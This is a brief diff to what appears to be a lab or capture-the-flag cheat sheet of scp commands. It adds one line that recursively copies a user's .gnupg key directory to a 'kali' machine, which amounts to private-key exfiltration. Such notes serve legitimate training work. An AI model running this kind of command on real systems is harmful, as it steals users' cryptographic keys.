@@ -3,3 +3,6 @@
 #Copy from remote file to local vm
 scp -P 2222 student@192.168.166.52:/challenge/flag.rar /tmp/flag.rar
 
+#recursive
+scp -r /home/mindsflee/.gnupg kali@192.168.49.124:/tmp/
+
